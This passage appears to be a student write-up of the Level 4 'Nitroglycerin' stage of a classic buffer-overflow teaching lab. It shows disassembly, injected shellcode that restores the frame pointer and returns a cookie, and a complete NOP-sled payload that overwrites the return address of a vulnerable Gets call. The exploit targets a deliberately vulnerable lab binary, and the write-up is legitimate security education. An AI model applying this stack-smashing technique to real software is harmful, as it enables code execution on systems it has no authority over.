70 31 68 55 #saved %ebp (gdb)
28 31 68 55 #the start address of the input string
```

##### Level 4: Nitroglycerin

```assembly
08048cc9 <getbufn>:
 8048cc9:	55                   	push   %ebp
 8048cca:	89 e5                	mov    %esp,%ebp
 8048ccc:	81 ec 08 02 00 00    	sub    $0x208,%esp
 8048cd2:	83 ec 0c             	sub    $0xc,%esp
 8048cd5:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax #512 bytes
 8048cdb:	50                   	push   %eax #break
 8048cdc:	e8 1c 01 00 00       	call   8048dfd <Gets>
 8048ce1:	83 c4 10             	add    $0x10,%esp
 8048ce4:	b8 01 00 00 00       	mov    $0x1,%eax
 8048ce9:	c9                   	leave  
 8048cea:	c3                   	ret    
```

40bytes + 4bytes(saved %ebp) + 4 bytes(return address)

```assembly
08048ceb <testn>:
 8048ceb:	55                   	push   %ebp
 8048cec:	89 e5                	mov    %esp,%ebp
 8048cee:	83 ec 18             	sub    $0x18,%esp #%ebp = %esp + 0x18
 8048cf1:	c7 45 f0 ef be ad de 	movl   $0xdeadbeef,-0x10(%ebp)
 8048cf8:	e8 cc ff ff ff       	call   8048cc9 <getbufn>
+8048cfd:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048d00:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048d03:	3d ef be ad de       	cmp    $0xdeadbeef,%eax
 8048d08:	74 12                	je     8048d1c <testn+0x31>
 8048d0a:	83 ec 0c             	sub    $0xc,%esp
 8048d0d:	68 80 a3 04 08       	push   $0x804a380
 8048d12:	e8 e9 fb ff ff       	call   8048900 <puts@plt>
 8048d17:	83 c4 10             	add    $0x10,%esp
 8048d1a:	eb 41                	jmp    8048d5d <testn+0x72>
 8048d1c:	8b 55 f4             	mov    -0xc(%ebp),%edx
 8048d1f:	a1 20 b2 04 08       	mov    0x804b220,%eax
 8048d24:	39 c2                	cmp    %eax,%edx
 8048d26:	75 22                	jne    8048d4a <testn+0x5f>
 8048d28:	83 ec 08             	sub    $0x8,%esp
 8048d2b:	ff 75 f4             	pushl  -0xc(%ebp)
 8048d2e:	68 e4 a3 04 08       	push   $0x804a3e4
 8048d33:	e8 f8 fa ff ff       	call   8048830 <printf@plt>
 8048d38:	83 c4 10             	add    $0x10,%esp
 8048d3b:	83 ec 0c             	sub    $0xc,%esp
 8048d3e:	6a 04                	push   $0x4
 8048d40:	e8 1b 07 00 00       	call   8049460 <validate>
 8048d45:	83 c4 10             	add    $0x10,%esp
 8048d48:	eb 13                	jmp    8048d5d <testn+0x72>
 8048d4a:	83 ec 08             	sub    $0x8,%esp
 8048d4d:	ff 75 f4             	pushl  -0xc(%ebp)
 8048d50:	68 04 a4 04 08       	push   $0x804a404
 8048d55:	e8 d6 fa ff ff       	call   8048830 <printf@plt>
 8048d5a:	83 c4 10             	add    $0x10,%esp
 8048d5d:	c9                   	leave  
 8048d5e:	c3                   	ret    
```

```assembly
leal 0x18(%esp), %ebp #recover %ebp
movl $0x6c31382d, %eax #cookie
push $0x08048cfd
ret
```

> $  gcc -m32 -c nitroglycerin.s
>
> $  objdump -D nitroglycerin.o > nitroglycerin.d

```assembly
nitroglycerin.o:	file format Mach-O 32-bit i386

Disassembly of section __TEXT,__text:
__text:
       0:	8d 6c 24 18 	leal	24(%esp), %ebp
       4:	b8 2d 38 31 6c 	movl	$1815164973, %eax
       9:	68 fd 8c 04 08 	pushl	$134515965
       e:	c3 	retl
```

```
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90 #nop
8d 6c 24 18
b8 2d 38 31
6c 68 fd 8c
04 08 c3 00 #attack code
90 90 90 90
90 90 90 90 #nop
00 00 00 00 #saved %ebp(from attack code)
98 2f 68 55 #the maximum address of the input address
```